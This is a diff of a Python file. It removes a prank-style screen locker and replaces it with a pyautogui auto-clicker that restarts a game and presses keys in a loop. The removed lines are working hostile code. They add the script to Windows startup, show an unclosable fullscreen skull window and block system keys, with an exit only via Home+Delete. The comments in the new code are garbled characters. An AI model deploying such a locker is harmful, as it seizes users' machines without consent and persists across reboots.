@@ -1,96 +1,44 @@
-import os
-import sys
-import tkinter as tk
-import subprocess
+import pyautogui
+import keyboard
+import time
+time.sleep(3)
+check_interval = 10
+def smart_click(location):
+    x, y = location
+    pyautogui.moveTo(x - 5, y, duration=0.1)
+    pyautogui.moveTo(x, y, duration=0.1)
+    pyautogui.click()
+while True:
+    # ��������� ������ "����� � ����"
+    try:
+        exit_location = pyautogui.locateCenterOnScreen("exit_to_menu.png", confidence=0.7)
+        if exit_location:
+            smart_click(exit_location)
+            time.sleep(600)
+    except pyautogui.ImageNotFoundException:
+        pass  # ������ ��� �� ���������, ����������
+
+    # ��������� ������ "������ ����"
+    try:
+        start_location = pyautogui.locateCenterOnScreen("start_button.png", confidence=0.7)
+        if start_location:
+            pyautogui.click(start_location)
+            time.sleep(2)
+            pyautogui.click(start_location)
+            pyautogui.click(start_location)
+            time.sleep(30)
+            keyboard.press('w')
+            time.sleep(0.4)
+            keyboard.release('w')
+
+            keyboard.press('shift')
+            time.sleep(1)
+            keyboard.release('shift')
 
 
-try:
-    import keyboard
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
-    import keyboard
+                
 
+    except pyautogui.ImageNotFoundException:
+        pass  # ������ ��� �� ���������, ���
 
-def add_to_startup():
-    startup_dir = os.path.join(
-        os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup"
-    )
-    script_path = os.path.abspath(sys.argv[0])
-    shortcut_path = os.path.join(startup_dir, "FullscreenApp.bat")
-    if not os.path.exists(shortcut_path):
-        with open(shortcut_path, "w") as f:
-            f.write(f'@echo off\npython "{script_path}"\n')
-
-
-root = tk.Tk()
-root.attributes("-fullscreen", True)
-root.attributes("-topmost", True)
-root.configure(bg="black")
-root.protocol("WM_DELETE_WINDOW", lambda: None)
-
-
-ascii_art = """
-
-         .e$$$$e.
-       e$$$$$$$$$$e
-      $$$$$$$$$$$$$$
-     d$$$$$$$$$$$$$$b
-     $$$$$$$$$$$$$$$$
-    4$$$$$$$$$$$$$$$$F
-    4$$$$$$$$$$$$$$$$F
-     $$$" "$$$$" "$$$
-     $$F   4$$F   4$$
-     '$F   4$$F   4$"
-      $$   $$$$   $P
-      4$$$$$"^$$$$$%
-       $$$$F  4$$$$
-        "$$$ee$$$"
-        . *$$$$F4
-         $     .$
-         "$$$$$$"
-          ^$$$$
- 4$$c       ""       .$$r
- ^$$$b              e$$$"
- d$$$$$e          z$$$$$b
-4$$$*$$$$$c    .$$$$$*$$$r
- ""    ^*$$$be$$$*"    ^"
-          "$$$$"
-        .d$$P$$$b
-       d$$P   ^$$$b
-   .ed$$$"      "$$$be.
- $$$$$$P          *$$$$$$
-4$$$$$P            $$$$$$"
- "*$$$"            ^$$P
-    ""              ^"
-
-
-"""
-
-label = tk.Label(root, text=ascii_art, font=("Courier", 20),
-                 fg="green", bg="black", justify="center")
-label.place(relx=0.5, rely=0.5, anchor="center")
-
-
-pressed_keys = set()
-def on_key_press(event):
-    pressed_keys.add(event.keysym)
-    if "Home" in pressed_keys and "Delete" in pressed_keys:
-        root.destroy()
-def on_key_release(event):
-    pressed_keys.discard(event.keysym)
-root.bind("<KeyPress>", on_key_press)
-root.bind("<KeyRelease>", on_key_release)
-
-
-keyboard.block_key('left windows')
-keyboard.block_key('right windows')
-keyboard.block_key('ctrl')
-keyboard.block_key('alt')
-keyboard.block_key('tab')
-keyboard.block_key('esc')
-
-
-add_to_startup()
-
-
-root.mainloop()
+    time.sleep(check_interval)
